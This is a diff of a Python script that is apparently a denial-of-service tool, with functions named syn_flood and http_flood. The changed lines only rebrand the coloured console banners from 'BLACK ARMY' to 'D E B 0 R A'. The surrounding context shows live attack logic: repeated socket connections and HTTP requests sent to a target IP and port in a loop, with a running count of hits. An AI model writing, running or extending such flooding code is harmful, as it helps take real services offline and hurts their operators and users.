@@ -121,7 +121,7 @@ def syn_flood(ip, port, duration):
             sock.connect((ip, port))
             sent += 1
             print(f"\033[31m[]  \033[32m TASBIH CINTA  \033[100m\033[97mSYN FL00D\033[0m  \033[104m\033[97m{sent}\033[0m  \033[38;5;206m{ip}  \033[97mrunning\033[0m")
-            print(f"\033[97m[]  \033[104m\033[38;5;39m TASBIH CINTA\033[0m  \033[38;5;206mSYN FL00D\033[0m  \033[97m{sent}\033[0m  \033[103m\033[32m{ip}  \033[33mrunning\033[0m")
+            print(f"\033[97m[]  \033[104m\033[38;5;39m TASBIH CINTA\033[0m  \033[38;5;206mSYN FL00D\033[0m  \033[97m{sent}\033[0m  \033[103m\033[32m{ip}\033[0m  \033[33mrunning\033[0m")
             sock.close()
         except OSError:
             pass
@@ -152,8 +152,8 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"\033[31m[]  \033[7m\033[97mBLACK ARMY\033[0m  \033[100m\033[31mHTTP FL00D\033[0m  \033[32m{sent} TARGET  \033[103m\033[97m{ip}\033[0m")
-            print(f"\033[33m[]  \033[32mBLACK ARMY  \033[32mHTTP FL00D \033[0m \033[33m{sent} TARGET  \033[38;5;206m{ip}\033[0m")
+            print(f"\033[31m[]  \033[7m\033[97mD E B 0 R A\033[0m  \033[100m\033[31mHTTP FL00D\033[0m  \033[32m{sent} TARGET  \033[103m\033[97m{ip}\033[0m")
+            print(f"\033[33m[]  \033[32mD E B 0 R A  \033[32mHTTP FL00D \033[0m \033[33m{sent} TARGET  \033[38;5;206m{ip}\033[0m")
         except KeyboardInterrupt:
             print("\n[-] Attack stopped by user")
             break
